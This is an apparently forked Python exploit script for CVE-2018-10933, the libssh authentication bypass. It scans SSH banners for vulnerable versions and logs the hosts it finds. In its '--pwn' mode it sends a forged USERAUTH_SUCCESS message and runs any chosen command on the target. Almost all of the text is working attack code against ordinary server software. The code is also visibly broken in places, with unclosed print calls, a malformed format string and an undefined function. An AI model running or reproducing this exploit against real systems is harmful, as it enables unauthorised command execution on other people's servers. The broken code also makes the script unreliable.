# CVE -2018-10933 forked  testing script made by Freed0m.
# This tool is able to perform two types of testing:
# 1 - Try to grab the SSH library version, and if it matches to a vulnerable one, print( a msg and exit.
# 2 - Attempt to initiate SSH connection to the specified target(s) and to bypass authentication
#     by sending SSH2_MSG_USERAUTH_SUCCESS message.

import subprocess
from socket import socket
import sys
from colorama import Fore, Style


def make_versions(start, end):
    _start = start.split('.')
    _end = end.split('.')

    intified_start = [int(i) for i in _start] 
    intified_end = [int(i) for i in _end]
    versions = [start]

    for i in range(len(intified_start)): 
        while int(intified_start[i]) < (intified_end[i]):
            intified_start[i] += 1
            versions.append('.'.join(map(str, intified_start)))

    return versions


def check_ssh_version(host, port, versions): #change this to check the SSH hash, add colors
    target = (str(host), int(port))
    S.connect(target)

    try:
        banner = S.recv(1024)
        S.close()

        for version in versions:
            if version not in banner:
                version_valid = version + ' = invalid version'
                print('[-] Host is patched', Fore.RED, Style.RESET_ALL)
            else:
                print('[+] Host *MIGHT* be vulnerable, saving to log', Fore.GREEN, Style.RESET_ALL)
                version_valid = version + ' = valid version'
            with open('vulnerable_hosts.txt', 'a') as f:
                output = ' '.join([host + ':' + port, version_valid, '\n'])
                f.write(output)

    except Exception as e:
        print(e)
        print('[-] Could not connect to %s using port %s, please check the address and the port', 'red' % (host, port), Fore.RED, Style. RESET_ALL)

def sshlib_connect(host, port, command):
    try:
        paramiko.util.log_to_file('debug.log')
        S.connect((host, int(port)))
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        msg = paramiko.message.Message()
        transport = paramiko.transport.Transport(S)
        transport.start_client()
        msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(msg)

        cmd_channel = transport.open_session(timeout=15)
        cmd_channel.exec_command(command)

        stdout = cmd_channel.makefile('rb', bufsize)
        stderr = cmd_channel.makefile_stderr('rb', bufsize)

        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()
        print('\n[*]Command requested: ' + command)
        print(colored('\n[+]Command output: ' + (output + error).decode(), 'green'))

    except Exception as e:
        print(e)

def help():
    print( 'This tools is intended to scan and\or run a command on vulnerable libssh servers')
    print( 'by exploiting the CVE-2018-10933 vulnerability ')
    print( 'Written by @x_Freed0m')
    print( '\nUsage: ')
    print( 'python CVE-2018-10933.py HOST PORT MODULE[-scan\-pwn] COMMAND[if pwn is used]')
    sys.exit()

if __name__ == '__main__':
    S = socket()
    bufsize = 2048
    versions = make_versions('0.6.0', '0.8.4')
    host = sys.argv[1]
    port = sys.argv[2]
    module = sys.argv[3]
    if module == '--scan':
        print( '\n[*] Starting to scan ' + host
        check_ssh_version(host, port, versions)
    elif module == '--pwn':
        if len(sys.argv) != 5:
            print( '\n[*] Please specify a command to run')
            sys.exit()
        else:
            import paramiko
            command = sys.argv[4]
            sshlib_connect(host, int(port), command)
    else:
        print( '\n[*]Please choose "-scan" or "-pwn"'
